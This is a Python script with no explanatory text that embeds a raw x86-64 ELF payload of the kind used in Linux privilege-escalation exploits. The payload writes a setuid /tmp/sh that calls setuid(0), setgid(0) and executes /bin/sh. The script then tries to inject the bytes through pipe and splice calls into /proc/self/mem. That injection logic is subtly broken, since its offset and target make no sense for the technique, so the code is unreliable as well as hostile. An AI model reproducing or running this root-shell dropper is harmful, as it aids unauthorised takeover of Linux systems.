import os
import sys
import ctypes
from ctypes import c_int, c_uint, c_char_p, c_void_p, c_size_t, c_ssize_t, POINTER, byref, Structure

PAGE_SIZE = 4096

elfcode = bytearray([
    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01,
    0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, 0x6a, 0x00,
    0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
])

libc = ctypes.CDLL("libc.so.6")
libc.pipe.argtypes = [POINTER(c_int * 2)]
libc.fcntl.argtypes = [c_int, c_int, c_int]
libc.splice.argtypes = [c_int, POINTER(c_size_t), c_int, POINTER(c_void_p), c_size_t, c_uint]
libc.read.argtypes = [c_int, c_void_p, c_size_t]
libc.write.argtypes = [c_int, c_void_p, c_size_t]
libc.open.argtypes = [c_char_p, c_int]
libc.open.restype = c_int
libc.close.argtypes = [c_int]
libc.fstat.argtypes = [c_int, POINTER(ctypes.Structure)]
libc.lseek.argtypes = [c_int, c_int, c_int]
libc.read.restype = c_ssize_t
libc.write.restype = c_ssize_t

class stat(Structure):
    _fields_ = [
        ('st_dev', ctypes.c_ulong),
        ('st_ino', ctypes.c_ulong),
        ('st_nlink', ctypes.c_ulong),
        ('st_mode', ctypes.c_uint),
        ('st_uid', ctypes.c_uint),
        ('st_gid', ctypes.c_uint),
        ('__pad0', ctypes.c_int),
        ('st_rdev', ctypes.c_ulong),
        ('st_size', ctypes.c_long),
        ('st_blksize', ctypes.c_long),
        ('st_blocks', ctypes.c_long),
        ('st_atim', ctypes.c_long * 2),
        ('st_mtim', ctypes.c_long * 2),
        ('st_ctim', ctypes.c_long * 2),
        ('__glibc_reserved', ctypes.c_long * 3)
    ]

F_SETPIPE_SZ = 1031
SPLICE_F_MOVE = 1
SPLICE_F_MORE = 4

def handle_error(ret, msg):
    if ret == -1:
        err = ctypes.get_errno()
        raise OSError(err, f"{msg}: {os.strerror(err)}")

# Create a pipe
pipefd = (c_int * 2)()
ret = libc.pipe(pipefd)
handle_error(ret, "pipe")

# Set the pipe buffer size to 0x1000 (PAGE_SIZE)
ret = libc.fcntl(pipefd[1], F_SETPIPE_SZ, PAGE_SIZE)
handle_error(ret, "fcntl F_SETPIPE_SZ")

# Open the memory file descriptor
memfd = libc.open(b"/proc/self/mem", os.O_RDWR)
handle_error(memfd, "open /proc/self/mem")

# Allocate a buffer for data transfer
buf = ctypes.create_string_buffer(PAGE_SIZE)

# Perform the data transfer
for i in range(0, len(elfcode), PAGE_SIZE):
    chunk = elfcode[i:i + PAGE_SIZE]
    nbytes = len(chunk)
    ctypes.memmove(buf, chunk, nbytes)

    ret = libc.write(pipefd[1], buf, nbytes)
    handle_error(ret, "write pipefd[1]")

    offset = ctypes.c_size_t(sys.getsizeof(elfcode))
    ret = libc.splice(pipefd[0], None, memfd, byref(offset), nbytes, SPLICE_F_MOVE | SPLICE_F_MORE)
    handle_error(ret, "splice")

libc.close(pipefd[0])
libc.close(pipefd[1])
libc.close(memfd)
